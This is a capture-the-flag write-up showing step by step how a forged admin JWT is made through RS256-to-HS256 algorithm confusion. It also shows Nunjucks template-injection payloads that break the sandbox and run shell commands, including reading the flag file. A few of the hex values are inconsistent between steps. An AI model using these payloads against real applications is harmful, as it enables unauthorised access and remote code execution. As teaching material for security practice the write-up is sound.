![image](https://user-images.githubusercontent.com/80063008/144762865-d6412a91-8935-4355-8eda-c4f9cb3e595b.png)

Main page shows a card and the login option in the lower right.

![image](https://user-images.githubusercontent.com/80063008/144762873-43448805-086d-4705-beed-4df3c483ed86.png)

Clicking on the card shows us a list of naughty and nice. It seems no one was nice.

![image](https://user-images.githubusercontent.com/80063008/144762875-e577ee4d-fb5d-411f-902d-b8b3c52e1c1b.png)

We can go to login and create a user:

![image](https://user-images.githubusercontent.com/80063008/144762878-1b1989b9-85b2-4ff3-be09-ac42a5dab9c1.png)

However we only get a page stating that access is denied. Checking the cookie though, we can see it's a JWT token.

![image](https://user-images.githubusercontent.com/80063008/144762882-ab120aea-a9f7-4704-b4a8-2c53d2635cee.png)

Putting it in https://jwt.io we can see it is using a RS256 algorithm with a public and private key to sign the token however the public key is in the data section.

![image](https://user-images.githubusercontent.com/80063008/144762886-b11935a2-be1e-445f-a942-ed4d29d7384b.png)

According to the source code that was provided, the token can also be verified with HS256 algorithm which allows us to try a Confusion Attack.

![image](https://user-images.githubusercontent.com/80063008/144762890-0f2ec4b5-50fa-4541-8466-e9e106656847.png)

I've followed the instructions on this page https://habr.com/en/post/450054/. This certainly could've been scripted or the jwt_tool could've been used but I was in a hurry and just followed my google search results. On the plus side, sometimes doing things manually allows for a better understanding and learning opportunity.

I've copied the public key and pasted it in sublime and used the regex to replace the \n with actual new lines.

![image](https://user-images.githubusercontent.com/80063008/144762891-26930101-6c9d-442e-adb3-2282d5c1b376.png)

So now we have it saved in a proper format as key.pem.

![image](https://user-images.githubusercontent.com/80063008/144762898-2707f4ee-aa57-4316-9642-852762ac74ea.png)

Now we can use the syntax below to turn it into ASCII hex and trim any other new lines I may have missed. Better safe than sorry.

```bash
cat key.pem | xxd -p | tr -d "\\n"
```
![image](https://user-images.githubusercontent.com/80063008/144762910-5479291a-d4a3-441e-a308-60f67ee9ac82.png)

I've modified the algorithm and user to HS256 and admin respectively.

![image](https://user-images.githubusercontent.com/80063008/144762925-eb565e92-edda-4b1d-a781-8d6539b5ed9c.png)

Now I copied the first two parts of the JWT (header and payload/red and purple) and ran the syntax below to supply the public key as ASCII hex to our signing operation.

```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6VTFKendEZWhGTFFFRk0yam5EN1xuWDErUkRnUDZOb2x4WTE1MFg4NEo0TUp6ODZtbS9BRkFTRU9jM1ZFbG9SK2Vnb2NXclROenQ1RzBvVnFzZmovSFxuQXM1bWU0Y1V4S05Mek5YcWlOdCt3cy9wTW91ZTlaajVXSC9UcmVlL1MwRUR3eFBOM3JnOUlwR2xwQVN0Z01XY1xuZTB4UWNkQW05VCtvQUZLdVUxUW9sazQvWnZLc0pjU0lwb2xQU3l4dWVTckEya3lZUG83ZFgrVmsrcmIrRXNQUlxuaVI3ZHRyQ3JZMjdCUkE4VVRKc3ZZL3VKRzJBVEhGWFVyZ0doanFsck92blB0R3JxcEF2bFFwQjVqelN2SmpmaVxucWVuODNsNVRPUEZuSEV5VmxNam44blhGQUdPRnAwckVBajJkbXlwWVIyU2plWDBYTnNNbWpiV3UzTU8ySVVhaVxuOXdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODczNDQ2M30"| openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b43415145416a6a536972772f64746b633761676950476751330a456734494762744e2f6268506c4c4d34504f5248336a72787a6274785846543537453257644f6539586f34564a55577448767959305439614362714d4e4b6b470a63365762344273337973746c79447a727137536d6f3946386d525130736d704a3771534b4e6f5a7449484a744f547a6a4d473536414c395a695a61326b3653430a306f61556b556c4d57745a685a346c5642565942552f434f344e64626770454b69444e4b497062314e4a5a76634457367a3273316c6e49666e417073564f48410a6a4b6c52542f634f2f424876413839616250644e473731513678375279765637616f794466395a4e4a2f3176417743426c436a713079723433386c7a4537494e0a647141585859795a7a2f356b556d574c505a456b637464352f597364694b392b727a635366776b744e71464c47616e6d646a71345476362b596b62544e7739530a67514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d
```
![image](https://user-images.githubusercontent.com/80063008/144762937-7fed5591-590e-4645-bf60-bba03b674493.png)

And we get our HMAC signature.

cf14cfe167a94210316c1b82fa221b4284a2096f830ec70f45f78777de17b796

Using python we can turn the HMAC signature from it's current ASCII hex state to JWT format. Basically base64 encode it to be safe for for url and take out the = in case one is there.

```bash
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('42890a49ab8265b03bf14acc5f9bdfb899a1b249a05fabc11fcc051330e98be5')).replace('=','')\")"
```
![image](https://user-images.githubusercontent.com/80063008/144762948-49b9680e-5429-4657-96a7-02a1043f3785.png)

zxTP4WepQhAxbBuC-iIbQoSiCW-DDscPRfeHd94Xt5Y

Now we just append that to our JWT token. This is the blue part of the token. The final token looks like this.

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6VTFKendEZWhGTFFFRk0yam5EN1xuWDErUkRnUDZOb2x4WTE1MFg4NEo0TUp6ODZtbS9BRkFTRU9jM1ZFbG9SK2Vnb2NXclROenQ1RzBvVnFzZmovSFxuQXM1bWU0Y1V4S05Mek5YcWlOdCt3cy9wTW91ZTlaajVXSC9UcmVlL1MwRUR3eFBOM3JnOUlwR2xwQVN0Z01XY1xuZTB4UWNkQW05VCtvQUZLdVUxUW9sazQvWnZLc0pjU0lwb2xQU3l4dWVTckEya3lZUG83ZFgrVmsrcmIrRXNQUlxuaVI3ZHRyQ3JZMjdCUkE4VVRKc3ZZL3VKRzJBVEhGWFVyZ0doanFsck92blB0R3JxcEF2bFFwQjVqelN2SmpmaVxucWVuODNsNVRPUEZuSEV5VmxNam44blhGQUdPRnAwckVBajJkbXlwWVIyU2plWDBYTnNNbWpiV3UzTU8ySVVhaVxuOXdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODczNDQ2M30.zxTP4WepQhAxbBuC-iIbQoSiCW-DDscPRfeHd94Xt5Y

We put the token in the web browser of our choice and refresh the page. We can see we have access to the elf listing.

![image](https://user-images.githubusercontent.com/80063008/144762952-c369bed7-069d-48e0-ba52-eb3b1751a333.png)

According to the source code, there is some nunjucks templating being used here.

![image](https://user-images.githubusercontent.com/80063008/144762986-bd8959a8-6939-48af-b9b9-92f9641546c9.png)

We can try to confirm if we have SSTI (Server Side Template Injection) with a standard payload dof {{7*7}}

![image](https://user-images.githubusercontent.com/80063008/144762963-f264e711-b729-4dde-a1ea-099645034b41.png)

We edit the elf name with that payload, refresh the main page where we have the nice vs naughty list and can see that indeed, it was interpreted and we have SSTI.

![image](https://user-images.githubusercontent.com/80063008/144762992-c2c21e16-4133-4660-a454-f65f203ed9c0.png)

We google around for a bit regarding nunjucks SSTI and can find this article. http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine

We have nunjucks ssti and can read the flag by breaking out of the sandbox. We have command execution. 

```bash
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```
![image](https://user-images.githubusercontent.com/80063008/144763004-d8c1191a-c0b2-4e6c-a330-082ab91bb870.png)

```bash
{{range.constructor("return global.process.mainModule.require('child_process').execSync('ls -la /')")()}}
```
The font makes it more difficult to read so we can just CTRL+U to see the webpage source:

![image](https://user-images.githubusercontent.com/80063008/144763016-a88d2555-c882-4664-80fa-ce9eff8533f0.png)

```bash
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag*')")()}}
```

![image](https://user-images.githubusercontent.com/80063008/144763023-7ceb568b-88a4-4167-b258-49757d915c6e.png)
![image](https://user-images.githubusercontent.com/80063008/144763026-d9518cd3-24bc-4f83-98bf-48e6b0640a22.png)

HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}
